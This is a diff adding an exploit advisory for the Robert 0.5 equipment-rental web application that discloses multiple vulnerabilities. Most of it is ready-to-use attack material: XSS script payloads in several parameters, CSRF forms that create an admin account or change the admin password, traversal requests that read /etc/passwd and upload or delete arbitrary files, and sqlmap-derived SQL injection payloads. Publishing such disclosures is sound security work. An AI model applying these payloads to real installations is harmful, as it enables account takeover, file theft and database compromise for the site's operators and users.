@@ -1,0 +1,196 @@
+# Exploit Title: Robert 0.5 - Multiple Vulnerabilities XSS, CSRF, Directory
+traversal & SQLi
+# Date: 07/06/2017
+# Exploit Author: Cyril Vallicari / HTTPCS - ZIWIT
+# Vendor website :http://robert.polosson.com/
+# Download link : https://github.com/RobertManager/robert/archive/master.zip
+# Live demo : http://robertdemo.polosson.com/
+# Version: 0.5
+# Tested on: Windows 7 x64 SP1 / Kali Linux
+
+
+Web-application open-source management of equipment park for rental or loan.
+Written in HTML, PHP, MySQL, CSS and Javascript.
+
+Description : Multiple security issues have been found :  XSS, CSRF,
+Directory Traversal, SQLi
+
+
+1- XSS reflected
+
+http://192.168.3.215/robert/index.php?go=infos%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+param vuln : go
+script vuln : index.php
+
+2- XSS reflected
+
+POST /robert/modals/personnel_list_techniciens.php
+data :
+searchingfor=%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E&searchingwhat=surnom
+param vuln : searchingfor
+script vuln : personnel_list_techniciens.php
+
+3- XSS Stored
+
+POST /robert/fct/matos_actions.php
+data:
+ action=addMatos&label=%22%3E%3Cscript%3Ealert(2)%3C%2Fscript%3E&ref="><script>alert(1)</script>&categorie=son&sousCateg=0&Qtotale=1&dateAchat=&tarifLoc=1&valRemp=1&externe=0&ownerExt=&remarque=%22%3E%3Cscript%3Ealert(3)%3C%2Fscript%3E
+param vuln : label, ref et remarque
+script vuln : matos_actions.php
+
+4- XSS Stored
+
+POST /robert/fct/packs_actions.php
+data
+:action=addPack&label=%22%3E%3Cscript%3Ealert(5)%3C%2Fscript%3E&ref="><script>alert(4)</script>&categorie=son&detail=undefined&externe=0&remarque=%22%3E%3Cscript%3Ealert(6)%3C%2Fscript%3E&detail={"2":1}
+param vuln : label, ref et remarque
+script vuln : packs_actions.php
+
+5- XSS stored
+
+POST /robert/fct/beneficiaires_actions.php
+action=modif&id=2&surnom="><script>alert(7)</script>&GUSO=&CS=&prenom="><script>alert(8)</script>&nom="><script>alert(9)</script>&email=&tel=&birthDay=0000-00-00&birthPlace=&habilitations=undefined&categorie=regisseur&SECU=&SIRET=N/A&intermittent=0&adresse=&cp=&ville=&assedic=
+param vuln : surnom, prenom, nom
+script vuln : beneficiaires_actions.php
+
+6- XSS stored
+
+POST /robert/fct/tekos_actions.php
+action=addStruct&id=1&label=test%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E&NomRS=&type="><script>alert(3)</script>&adresse=test"><script>alert(4)</script>&codePostal=12312&ville="><script>alert(5)</script>&email="><script>alert(6)</script>&tel=&SIRET="><script>alert(8)</script>&remarque=%22%3E%3Cscript%3Ealert(9)%3C%2Fscript%3E
+param vuln : label, type, adresse, ville, email, SIRET et remarque
+script vuln : beneficiaires_actions.php
+
+7- CSRF Create new admin
+
+<form action="http://192.168.3.215/robert/fct/user_actions.php"
+method="POST">
+<input type="hidden" name="action" value="create"/>
+<input type="hidden" name="cMail" value="hacked@hacked.com"/>
+<input type="hidden" name="cName" value="hacked"/>
+<input type="hidden" name="cPren" value="hacked"/>
+<input type="hidden" name="cPass" value="hacked"/>
+<input type="hidden" name="cLevel" value="7"/>
+<input type="hidden" name="cTekos" value="0"/>
+<input type="submit" value="CSRFED This Shit"/>
+</form>
+
+8- CSRF Change admin password and infos
+
+<form action="http://192.168.3.215/robert/fct/user_actions.php"
+method="POST">
+<input type="hidden" name="action" value="modifOwnUser"/>
+<input type="hidden" name="id" value="1"/>
+<input type="hidden" name="email" value="hacked"/>
+<input type="hidden" name="nom" value="hacked"/>
+<input type="hidden" name="prenom" value="hacked"/>
+<input type="hidden" name="password" value="hacked"/>
+<input type="submit" value="CSRFED This Shit"/>
+</form>
+
+9- Directory traversal on Download fonction ( Read Arbitrary File)
+
+http://192.168.3.215/robert/fct/downloader.php?dir=sql&file=../../../../../../etc/passwd
+param vuln : file
+script vuln : downloader.php
+
+10- Directory traversal on Upload fonction (Upload file in root path)
+
+POST
+/robert/fct/uploader.php?dataType=tekos&folder=../../config&qqfile=filename.jpg
+HTTP/1.1
+Host: 192.168.3.215
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101
+Firefox/53.0
+Accept: */*
+Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
+X-Requested-With: XMLHttpRequest
+X-File-Name: filename.jpg
+Content-Type: application/octet-stream
+Referer: http://192.168.3.215/robert/index.php?go=gens
+Content-Length: 99550
+Cookie: YOURCOOKIE
+Connection: close
+
+...snip...
+file data
+...snip...
+
+param vuln : folder
+script vuln : uploader.php
+
+
+11- Directory traversal on Delete fonction (Delete Arbitrary File)
+
+POST /robert/fct/plans_actions.php HTTP/1.1
+Host: 192.168.3.215
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101
+Firefox/53.0
+Accept: */*
+Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+Referer: http://192.168.3.215/robert/index.php?go=calendrier
+Content-Length: 42
+Cookie:YOURCOOKIE
+Connection: close
+
+action=supprFichier&idPlan=4&file=../../../../tested.txt
+
+param vuln : file
+script vuln : plans_actions.php
+
+11- SQL Injection
+
+
+POST /robert/fct/plans_actions.php HTTP/1.1
+Host: 192.168.3.215
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101
+Firefox/53.0
+Accept: */*
+Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+Referer: http://192.168.3.215/robert/index.php?go=calendrier
+Content-Length: 20
+Cookie: YOURCOOKIE
+Connection: close
+
+action=loadPlan&ID=2'
+
+POST parameter 'ID' is vulnerable. Do you want to keep testing the others
+(if any)? [y/N]
+sqlmap identified the following injection point(s) with a total of 397
+HTTP(s) requests:
+---
+Parameter: ID (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+(NOT)
+    Payload: action=loadPlan&ID=2' OR NOT 8111=8111#
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP
+BY clause (FLOOR)
+    Payload: action=loadPlan&ID=2' AND (SELECT 3865 FROM(SELECT
+COUNT(*),CONCAT(0x7171787171,(SELECT
+(ELT(3865=3865,1))),0x717a7a7a71,FLOOR(RAND(0)*2))x FROM
+INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- XhTe
+
+    Type: stacked queries
+    Title: MySQL > 5.0.11 stacked queries (comment)
+    Payload: action=loadPlan&ID=2';SELECT SLEEP(5)#
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: action=loadPlan&ID=2' OR SLEEP(5)-- zwwN
+---
+
+param vuln : ID
+script vuln : plans_actions.php
+
+------------------------------------------------------------------------------------------------------------------------------
+
+#### Special Thanks to SC, PC and Mana l'artiste from HTTPCS - Ziwit
+SecTeam ####
+
+------------------------------------------------------------------------------------------------------------------------------
